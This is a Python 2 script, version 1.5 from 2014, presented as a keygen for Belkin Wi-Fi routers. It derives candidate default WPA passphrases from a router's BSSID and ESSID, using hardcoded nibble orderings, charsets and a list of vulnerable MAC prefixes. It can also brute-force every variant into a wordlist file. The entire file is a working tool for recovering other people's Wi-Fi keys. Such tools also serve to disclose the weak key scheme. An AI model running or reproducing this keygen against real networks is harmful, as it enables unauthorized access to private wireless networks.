
import re
import sys
import argparse

ORDER_0  = [6,2,3,8,5,1,7,4]
ORDER_1  = [1,2,3,8,5,1,7,4]
ORDER_2  = [1,2,3,8,5,6,7,4]
#ORDER_3  = [6,2,3,8,5,6,7,4] # Out after v1.4

CHARSET  = '024613578ACE9BDF'
charset  = '944626378ace9bdf'

charsets = [CHARSET,charset]
orders   = [ORDER_0,ORDER_1,ORDER_2]
KEYS     = []

def generateKey(wmac,charset=charset,order=ORDER_0):
    try:
        k = ''.join([wmac[order[i]-1] for i in xrange(len(wmac))])
        return ''.join([charset[int(c,16)] for c in k])
    except IndexError:
        sys.exit("[!] Use real bssids :)")
        
def printTargets():
    print "[+] Possible vulnerable targets so far:"
    print ""
    for e in essids:
        print "\t essid: {0:s}".format(e)
    print ""
    for t in targets:
        print ("\t bssid: {0:s}:uv:wx:yz ".format(t.upper()))
    
def addOneToMac(mac): 
    return "%012X" %(int(mac,16)+1)

def printUniqueKeys(output=sys.stdout):
    for k in set(KEYS):
        output.write(k+"\n")

def bruteforce(mac,output=sys.stdout,wordlist=False):     
    for i in xrange(3):
        for c in charsets:
            for o in orders:
                KEYS.append(generateKey(mac[4:], c, o)) 
        mac = addOneToMac(mac)

    if (wordlist):
        printUniqueKeys(output)
    else:
        printUniqueKeys()


if __name__ == '__main__':
    global targets
    version     = ' 1.5   [2014-05-09]' 
    targets     = ['94:44:52','08:86:3B','EC:1A:59']
    essids      = ['Belkin.XXXX','Belkin_XXXXXX','belkin.xxxx','belkin.xxx']    
                  
    
    parser = argparse.ArgumentParser(description='''>>> Keygen for WiFi routers manufactured by Belkin. 
                                                 So far only WiFi networks with essid like Belkin.XXXX, Belkin_XXXXXX, 
                                                 belkin.xxx and belkin.xxxx are likely vulnerable, although routers using those
                                                 macaddresses could be vulnerable as well.
                                                 Twitter: @enovella_  and   email: ednolo[at]inf.upv.es''',
                                                 epilog='''(+) Help: python  %s -b 94:44:52:00:C0:DE -e Belkin.c0de''' %(sys.argv[0])
                                    )
   
    maingroup = parser.add_argument_group(title='required')
    maingroup.add_argument('-b','--bssid', type=str, nargs='?', help='Target bssid')
    maingroup.add_argument('-e','--essid', type=str, nargs='?', help='Target essid. [BelkinXXXX,belkin.XXXX]')
    parser.add_argument('-v', '--version', action='version', version='%(prog)s'+version)
    parser.add_argument('-w','--wordlist', type=argparse.FileType('w'), nargs='?', help='Filename to store keys',default=sys.stdout)
    command_group = parser.add_mutually_exclusive_group()
    command_group.add_argument('-a','--allkeys', action="store_true",  help='Create all possible cases. Definitely recommended if first attempt fails')
    command_group.add_argument('-l','--list', help='List all vulnerable mac address so far', action='store_true')
    
    args = parser.parse_args()

    if args.list:
        printTargets()
    else:
        try:
            mac = re.sub(r'[^a-fA-F0-9]', '', args.bssid)
            if (len(mac)!=12):
                sys.exit("[!] Your bssid length looks wrong")
        except Exception:
            sys.exit("[!] Check out -h or --help")
        if (args.allkeys):
            try:
                if (args.wordlist.name == '<stdout>'):
                    print '[+] Your WPA keys might be :'
                    bruteforce(mac)
                elif (args.wordlist.name != '<stdout>'):
                    bruteforce(mac,output=args.wordlist,wordlist=True)
            except Exception:
                sys.exit("[!] Check the filename")
        elif (not args.essid):
            sys.exit("[!] Did you forget the -e parameter?")   
        elif (args.bssid and args.essid):       
            if (args.essid.startswith('B')):   # CHARSET-macwifi 
                KEYS.append(generateKey(mac[4:],CHARSET))
            elif (args.essid.startswith('b')): # charset-wanmac
                mac = addOneToMac(mac)
                if (mac.startswith('944452')):
                    KEYS.append(generateKey(mac[4:],charset))
                else:
                    ''' special case: charset-wanmac != order &&  charset-wanmac+1 '''
                    KEYS.append(generateKey(mac[4:],charset))
                    KEYS.append(generateKey(mac[4:],charset,ORDER_2))
                    mac = addOneToMac(mac)
                    KEYS.append(generateKey(mac[4:],charset))
            else:
                sys.exit("[!] Your essid should start with B or b")
            try:
                if (args.wordlist.name == '<stdout>'):
                    print '[+] Your WPA key might be :'
                    printUniqueKeys()
                elif (args.wordlist.name != '<stdout>'):     
                    printUniqueKeys(args.wordlist)                
            except Exception:
                sys.exit("[!] Forgot the filename?")
        else:
            sys.exit("[!] Check out -h or --help")

